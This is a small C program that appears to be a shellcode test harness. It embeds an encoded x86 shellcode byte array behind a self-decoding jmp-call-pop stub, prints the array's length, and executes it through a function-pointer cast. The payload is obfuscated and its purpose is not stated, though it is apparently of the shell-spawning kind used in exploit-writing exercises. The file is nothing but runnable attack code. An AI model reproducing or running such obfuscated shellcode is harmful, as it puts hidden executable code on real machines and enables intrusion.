#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xeb\x17\x5e\x31\xc0\xf7\xe0\x8a\x04\x16\x3c\xaa\x74\x10\xc0\xc8\x02\xf6\xd0\x88\x04\x16\x42\xeb\xee\xe8\xe4\xff\xff\xff\x3b\xfc\xbe\x5e\x43\x43\x32\x5e\x5e\x43\x76\x5a\x46\xd9\x70\xbe\xd9\x74\xb2\xd9\x78\x3d\xd3\xc8\xfd\xaa";



main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

	
